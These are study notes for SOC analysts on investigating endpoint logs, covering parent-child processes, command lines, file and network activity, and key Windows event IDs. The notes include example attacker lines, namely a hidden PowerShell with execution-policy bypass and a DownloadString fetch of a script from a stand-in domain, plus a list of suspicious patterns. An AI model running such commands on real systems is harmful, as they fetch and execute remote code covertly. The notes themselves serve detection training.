Endpoint Logs

Endpoint = a computer/device such as a laptop, desktop, or server.
Endpoint logs record what happens on that device.

🔹 What Endpoint Logs Show
User
 ↓
Process
 ↓
Command
 ↓
File activity
 ↓
Network activity
 ↓
Child process
Field	Meaning
User	Who performed the action
Host	Which computer
Process	Which program ran
Parent Process	Program that started the process
Command Line	What the process was told to do
File	File created/modified/executed
Source IP	Device's IP
Destination IP	Remote IP contacted
Time	When it happened
🔹 Process

A process = a running program.

powershell.exe
chrome.exe
cmd.exe
rundll32.exe
notepad.exe

⚠️ A suspicious process name does not automatically mean malware.

🔹 Parent & Child Process

Parent = program that started another program.

explorer.exe
    ↓
notepad.exe

Here:

Parent = explorer.exe
Child  = notepad.exe
🚨 Suspicious Example
WINWORD.EXE
    ↓
powershell.exe

Investigate because Word starting PowerShell can be unusual.

🔹 Command Line

The command line tells you what the process was instructed to do.

Normal:

powershell.exe -Command "Get-Process"

More suspicious:

powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden

Always check the full command line, not just the process name.

🔹 File Activity

Example:

Process: powershell.exe
Action: File Created
File: C:\Users\Ahmed\AppData\Temp\update.ps1

Investigate:

Who created it?
Which process created it?
Where did it come from?
Was it executed?
What does it do?
🔹 Network Activity

Example:

Process: powershell.exe
Source: 10.0.0.27
Destination: 45.92.31.18
Port: 80

Meaning:

PowerShell
   ↓
connected to
   ↓
45.92.31.18:80
🔹 Important Windows Events
Event ID	Meaning
4688	New process created
4104	PowerShell script content
1 (Sysmon)	Process creation
🚨 Suspicious Endpoint Patterns

Look for:

Office → PowerShell
Browser → PowerShell
PowerShell → suspicious network connection
PowerShell → downloads a script
Suspicious file created in AppData/Temp
rundll32.exe executing an unusual DLL
Hidden PowerShell
-ExecutionPolicy Bypass
Random executable/script names
One process creating another unusual process
🔍 L1 Investigation Flow
1. Identify the user
        ↓
2. Identify the computer
        ↓
3. Identify the process
        ↓
4. Check parent process
        ↓
5. Read command line
        ↓
6. Check file activity
        ↓
7. Check network activity
        ↓
8. Check child processes
        ↓
9. Investigate what happened afterward
🔗 DNS + Endpoint Correlation

Example:

DNS:
10.0.0.27 → suspicious-domain.com

Endpoint:
explorer.exe
    ↓
powershell.exe

PowerShell:
DownloadString("http://suspicious-domain.com/update.ps1")

Network:
10.0.0.27 → 45.92.31.18:80

File:
update.ps1 created
⭐ SOC Rule
Process alone = CLUE
Process + Command + File + Network = STRONGER EVIDENCE

Don't ask only "Is this process suspicious?"
Ask "Who started it, what did it do, where did it connect, and what happened afterward?"
